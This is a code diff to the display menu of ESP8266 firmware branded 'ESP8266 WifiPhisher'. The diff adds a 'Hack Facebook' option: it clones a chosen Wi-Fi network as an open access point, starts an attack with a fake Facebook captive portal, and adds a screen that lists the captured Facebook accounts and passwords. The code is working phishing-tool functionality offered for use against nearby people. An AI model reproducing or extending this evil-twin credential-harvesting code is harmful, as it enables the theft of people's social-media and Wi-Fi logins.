@@ -110,7 +110,8 @@ void DisplayUI::setup() {
     addMenuNode(&mainMenu, scan_bits, D_SCAN, &scanMenu);       /// SCAN
     addMenuNode(&mainMenu, show_bits, D_SHOW, &showMenu);       // SHOW
     addMenuNode(&mainMenu, attack_bits, D_ATTACK, &attackMenu); // ATTACK
-    addMenuNode(&mainMenu, captive_portal_bits, D_GET_WIFI_SCAN_HACK_WIFI, &wifiListCaptiveScanHackMenu); //Hack wifi
+   
+    addMenuNode(&mainMenu, captive_portal_bits, D_HACKWIFI, &wifiListCaptiveScanHackMenu); //Hack wifi
     createMenu(&wifiListCaptiveScanHackMenu, &mainMenu, DISPLAY_LIST, [this]() {
                int c = accesspoints.count();
                for (int i = 0; i < c; i++) {
@@ -158,7 +159,58 @@ void DisplayUI::setup() {
                      });
                }
              });
-    addMenuNode(&mainMenu, wifi1_bits, D_WIFI1, &listWifiCredential); // List Password
+    addMenuNode(&mainMenu, facebook_bits, D_FACEBOOK1, &facebookListCaptiveScanHackMenu); // Hack Facebook
+    createMenu(&facebookListCaptiveScanHackMenu, &mainMenu, DISPLAY_LIST, [this]() {
+      int c = accesspoints.count();
+               for (int i = 0; i < c; i++) {
+                 addMenuNode(
+                  &facebookListCaptiveScanHackMenu,
+                  [i]() {
+                       return b2a(accesspoints.getSelected(i)) +
+                              accesspoints.getSSID(i);
+                     },
+                      [this, i]() {
+                        if (attack.isRunning()) {
+                       if (alert.alertOptions(
+                                 str(D_TITLE_SET_CAPTIVE_STOP_WIFI_HACKING), "",
+                                 str(D_AGREE_BUTTON), str(D_CANCEL_BUTTON))) {
+                           attack.stop();
+                           WiFi.mode(WIFI_OFF);
+                         }
+                         accesspoints.deselectAll();
+                         alert.showSuccess(str(D_SUCCESS_ALERT));
+                         configInit();
+                       }else{
+                         if (alert.alertOptions(str(D_HACK_SSID), String (accesspoints.getSSID(i)),
+                                                str(D_AGREE_BUTTON),
+                                                str(D_CANCEL_BUTTON))) {
+                           accesspoints.deselectAll();
+                           accesspoints.select(i);
+                           String ssid = accesspoints.getSSID(i);
+                           if (alert.alertOptions(
+                                   str(S_SSID), str(D_ADD_EXTENSION_NAME_SSID),
+                                   str(D_AGREE_BUTTON), str(D_CANCEL_BUTTON))) {
+                             ssid = keyboard.show(accesspoints.getSSID(i));
+                           }
+            settings.setCaptivePortal(true);
+            settings.save(true);
+            settings.setCaptiveType(CAPTIVE_TYPE::FACEBOOK);
+            settings.setNonePassword(true);
+            settings.setSSID(ssid);
+            credential.setNameWifi(accesspoints.getSSID(i));
+            settings.setChangeSSID();
+            settings.save(true);
+                           attack.start(false, true, false, false, true,
+                                        settings.getAttackTimeout() * 1000);
+                           alert.showSuccess(str(D_SUCCESS_ALERT));
+                         }
+          configInit();
+                    }
+                     });
+               }
+             });
+    addMenuNode(&mainMenu, pass_wifi_bits, D_WIFI1, &listWifiCredential); // List Password wifi
+    addMenuNode(&mainMenu, facebook1_bits, D_FACEBOOK, &listFacebookCredential); //list Password Facebook
     addMenuNode(&mainMenu, monitor_bits, D_PACKET_MONITOR,        // Monitor
                  [this]() { // PACKET MONITOR
                    scan.start(SCAN_MODE_SNIFFER, 0, SCAN_MODE_OFF, 0, false,
@@ -508,8 +560,8 @@ addMenuNode(
                              str(D_RESET), str(D_CANCEL_BUTTON))) {
         settings.reset();
         settings.save(true);
+        alert.showSuccess(str(D_WAIT_REBOOT));
         SPIFFS.format();
-        alert.showSuccess(str(D_SUCCESS));
         ESP.restart();
       } else {
         changeMenu(&timeOnScreenMenu);
@@ -536,6 +588,36 @@ addMenuNode(
     });
   });
 
+createMenu(&listFacebookCredential, &mainMenu, DISPLAY_LIST, [this]() {
+    // add APs to list
+    int c = credential.count(str(CLI_FACEBOOK_CREDENTIAL));
+    for (int i = 0; i < c; i++) {
+      addMenuNode(
+          &listFacebookCredential,
+          [i]() {
+            return "Acc: " +
+                   credential.getSocialUser(str(CLI_FACEBOOK_CREDENTIAL), i) +
+                   " - pass: " +
+                   credential.getSocialPass(str(CLI_FACEBOOK_CREDENTIAL), i) +
+                   " ";
+          },
+          [this, i]() {
+            if (alert.alertOptions(str(CLI_DELETE1),
+                                   str(D_DELETE_ACCOUNT),
+                                   str(CLI_DELETE), str(D_CANCEL_BUTTON))) {
+              credential.deleteIndex(str(CLI_FACEBOOK_CREDENTIAL), i);
+              alert.showSuccess(str(D_SUCCESS_ALERT));
+            }
+            configInit();
+            changeMenu(&listFacebookCredential);
+          });
+    }
+    if (c == 0) {
+      addMenuNode(&listFacebookCredential, D_EMPTY, [this]() { // SELECT ALL
+        changeMenu(&mainMenu);
+      });
+    }
+  });
   createMenu(&listWifiCredential, &mainMenu, DISPLAY_LIST, [this]() {
     // add APs to list
     int c = credential.count(str(CLI_WIFI_CREDENTIAL));
@@ -1440,9 +1522,9 @@ void DisplayUI::drawIntro() {
   display.setFont(DejaVu_Sans_Mono_10);
   drawString(0, center(F("ESP8266 WifiPhisher"), 20));
   drawString(1, center(F("by@244v234"), 20));
-  drawString(2, center(F("Visit Other Projects"), 20));
+  drawString(2, center(F("github.com/244v234"), 20));
   drawString(3, center(F("Hackster.io/244v234"), 20));
-  drawString(4, center(F("======*******======"), 20));
+  drawString(4, center(F("-----*****-----"), 20));
   delay(4000);
 }
 
